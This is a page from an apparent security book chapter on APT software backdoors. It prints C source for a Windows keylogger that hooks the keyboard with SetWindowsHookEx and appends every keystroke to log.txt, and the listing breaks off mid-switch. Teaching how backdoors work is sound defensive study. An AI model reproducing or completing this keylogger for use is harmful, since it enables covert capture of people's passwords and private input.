<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1b2" class="pf w2 h2" data-page-no="1b2"><div class="pc pc1b2 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">411</span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">as a stand-alone win32 GUI app, which when run, will log all ke<span class="_ _0"/>ystrokes to the log</div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">.txt î€‚le in the current directory of the binary:</div><div class="t m0 x3 h40 y19bc fff fs5 fc0 sc0 ls0 ws0">#include &lt;stdio.h&gt;</div><div class="t m0 x3 h40 y19bd fff fs5 fc0 sc0 ls0 ws0">#include &lt;windows.h&gt;</div><div class="t m0 x3 h40 y19be fff fs5 fc0 sc0 ls0 ws0">#include &lt;ctype.h&gt;</div><div class="t m0 x3 h40 y19bf fff fs5 fc0 sc0 ls0 ws0">#define FILENAME "log.txt"</div><div class="t m0 x3 h40 y2702 fff fs5 fc0 sc0 ls0 ws0">void processKeyStroke(int key);</div><div class="t m0 x3 h40 y2703 fff fs5 fc0 sc0 ls0 ws0">LRESULT CALLBACK KeyboardHook( int nCode, WPARAM wParam, LPARAM lParam );</div><div class="t m0 x3 h40 y2704 fff fs5 fc0 sc0 ls0 ws0">HHOOK hHook;</div><div class="t m0 x3 h40 y2705 fff fs5 fc0 sc0 ls0 ws0">int APIENTRY WinMain(HINSTANCE hInstance,</div><div class="t m0 x3 h40 y2706 fff fs5 fc0 sc0 ls0 ws0">HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow )</div><div class="t m0 x3 h40 y2707 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y2708 fff fs5 fc0 sc0 ls0 ws0"> hHook = SetWindowsHookEx(13, KeyboardHook, hInstance , 0);</div><div class="t m0 x3 h40 y2709 fff fs5 fc0 sc0 ls0 ws0"> while (GetMessage(NULL,NULL,0,0)) ; // NOP while not WM_QUIT</div><div class="t m0 x3 h40 y270a fff fs5 fc0 sc0 ls0 ws0"> return UnhookWindowsHookEx(hHook);</div><div class="t m0 x3 h40 y270b fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h40 y270c fff fs5 fc0 sc0 ls0 ws0">LRESULT CALLBACK KeyboardHook (int nCode, WPARAM wParam, LPARAM lParam )</div><div class="t m0 x3 h40 y270d fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y270e fff fs5 fc0 sc0 ls0 ws0"> if (nCode == HC_ACTION)</div><div class="t m0 x3 h40 y270f fff fs5 fc0 sc0 ls0 ws0">    if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)</div><div class="t m0 x3 h40 y2710 fff fs5 fc0 sc0 ls0 ws0">    processKeyStroke (((PKBDLLHOOKSTRUCT)lParam)-&gt;vkCode);</div><div class="t m0 x3 h40 y2711 fff fs5 fc0 sc0 ls0 ws0"> return CallNextHookEx(hHook, nCode, wParam, lParam);</div><div class="t m0 x3 h40 y2712 fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h40 y2713 fff fs5 fc0 sc0 ls0 ws0">void processKeyStroke(int key)</div><div class="t m0 x3 h40 y2714 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y2715 fff fs5 fc0 sc0 ls0 ws0">FILE *outFile = fopen(FILENAME,"a+");</div><div class="t m0 x3 h40 y2716 fff fs5 fc0 sc0 ls0 ws0">// Key is an ASCII Printable Number Character</div><div class="t m0 x3 h40 y2717 fff fs5 fc0 sc0 ls0 ws0">if (key &gt;=48 &amp;&amp; key &lt;= 59)</div><div class="t m0 x3 h40 y2718 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y2719 fff fs5 fc0 sc0 ls0 ws0">  // Special Characters</div><div class="t m0 x3 h40 y271a fff fs5 fc0 sc0 ls0 ws0">  if (GetKeyState(VK_CAPITAL) || GetKeyState(VK_LSHIFT) &lt; 0 ) </div><div class="t m0 x3 h40 y271b fff fs5 fc0 sc0 ls0 ws0">  {</div><div class="t m0 x3 h40 y271c fff fs5 fc0 sc0 ls0 ws0">    switch (key)</div><div class="t m0 x3 h40 y271d fff fs5 fc0 sc0 ls0 ws0">    {</div><div class="t m0 x3 h40 y271e fff fs5 fc0 sc0 ls0 ws0">     case 48:</div><div class="t m0 x3 h40 y271f fff fs5 fc0 sc0 ls0 ws0">     fprintf(outFile,"%s",")");</div><div class="t m0 x3 h40 y2720 fff fs5 fc0 sc0 ls0 ws0">     break;</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>